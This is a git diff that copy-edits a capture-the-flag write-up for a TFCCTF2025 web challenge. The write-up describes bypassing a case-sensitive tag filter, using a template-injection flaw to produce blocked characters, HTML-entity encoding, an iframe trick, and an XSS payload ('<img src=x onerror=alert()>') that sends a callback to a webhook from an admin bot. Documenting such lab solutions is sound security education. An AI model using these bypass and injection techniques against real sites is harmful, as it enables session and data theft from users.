@@ -43,7 +43,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
 ```
 
 <br />
-As we can see the banned list check doesn't check for capital case letters.
+As we can see, it does not check for capital letters.
 <br />
 
 ```py
@@ -58,7 +58,7 @@ So we can enter "Src" and it will be fine.
 <br />
 <img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/1.png">
 <br />
-Now we need to think about getting a xss using open and closing tag but it's blocked but we have an ssti here in render_page function 
+Now we need to think about getting an XSS using opening and closing tags, but they are blocked. However, we have an SSTI in the render_page function.
 <br />
 
 ```py
@@ -70,13 +70,13 @@ Now we need to think about getting a xss using open and closing tag but it's blo
 
 <br />
 
-So we can access anything from banned list which contain our needed string using the ssti we have the open and closing tag for xss in banned here, so to get `<` for example we can do `${banned[1]}` this will get us `<` Let's try get `<`: 
+So we can access anything from the banned list, which contains the strings we need, using the SSTI. The open and closing tags for XSS are in the banned list. To get `<`, for example, we can use `${banned[1]}` this will get us `<`: 
 
 <br />
 <img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/2.png">
 <br />
 
-As we can see it worked now can get a working payload like `<img src=x onerror=alert()>`
+As we can see, it worked. Now we can create a working payload like: `<img src=x onerror=alert()>`
 
 I replaced s with S and l with L 
 
@@ -88,11 +88,11 @@ I replaced s with S and l with L
 <img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/3.png">
 <br />
 
-But if we want to insert the webhook it will contain a lot of things that blocked but we can use encoding since we have `${banned[0]}` as `&` we can use html encoding for instance `${banned[0]}#x3d` get converted to `=` 
+But if we want to insert the webhook, it will contain many characters that are blocked. However, we can use encoding since we have `${banned[0]}` as `&` we can use html encoding for instance `${banned[0]}#x3d` get converted to `=` 
 
 
 
-Let's make a script that will help us convert everything 
+Let's make a script that will help us convert everything.
 <br />
 
 ```py
@@ -115,7 +115,7 @@ ${banned[0]}#x3c${banned[0]}#x69${banned[0]}#x6d${banned[0]}#x67${banned[0]}#x2f
 <img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/9.png">
 <br />
 
-But when we try it it's rendered as text we can use an iframe to load it as html
+But when we try it, it’s rendered as text. We can use an iframe to load it as HTML
 
 ```py
 st, nd, td = [f"${{banned[{i}]}}" for i in range(3)]
@@ -168,14 +168,14 @@ Got a callback, Let's report to the bot:
 
 <br />
 
-We didn't get callback, looking at the bot, Found this option that will disable image loading:
+We didn’t get a callback. Looking at the bot, we found this option that will disable image loading:
 <br />
 
 ```py
 chrome_opts.add_argument("--blink-settings=imagesEnabled=false")
 ```
 
-Let's try another payload that doesn't contain an image
+Let’s try another payload that doesn’t contain an image.
 
 ```py
 st, nd, td = [f"${{banned[{i}]}}" for i in range(3)]
